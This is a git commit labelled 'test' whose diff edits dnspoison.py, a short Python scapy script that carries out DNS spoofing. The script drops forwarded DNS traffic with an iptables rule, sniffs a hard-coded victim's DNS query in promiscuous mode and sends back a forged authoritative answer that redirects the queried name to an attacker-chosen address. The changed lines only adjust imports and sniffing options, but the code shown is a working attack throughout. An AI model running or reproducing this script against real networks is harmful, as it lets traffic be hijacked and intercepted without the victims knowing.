da13c689ac2a774198c906b77068caa35f563ec2
m4ul <hansonlucas06@gmail.com>
2022-11-12 19:14:16 +0100

    test

--- dnspoison.py
+++ dnspoison.py
@@ -1,4 +1,4 @@
-from scapy.all import sniff, srp, IP, DNS, DNSQR, Ether, UDP, DNSRR, sendp, DNSRR
+from scapy.all import sniff, DNS, DNSQR, DNSRR, srp, IP, Ether, sendp, UDP
 from subprocess import Popen, PIPE
 
 victimIP = "10.5.1.2"
@@ -8,8 +8,14 @@ firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
 Popen([firewall], shell=True, stdout=PIPE)
 
 
-a=sniff(count=1, filter="udp and port 53 and host " + victimIP)
+a=sniff(count=1, filter="udp and port 53 and host " + victimIP, promisc=1)
 if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
     spoof = ((Ether())/IP(dst=a[IP].src, src=a[IP].dst)/UDP(dport=a[UDP].sport, sport=a[UDP].dport)/DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=a[DNS].qd.qname, ttl=10, rdata=gotoIP)))
     sendp(spoof, count=1)
     
+
+
+    
+
+
+
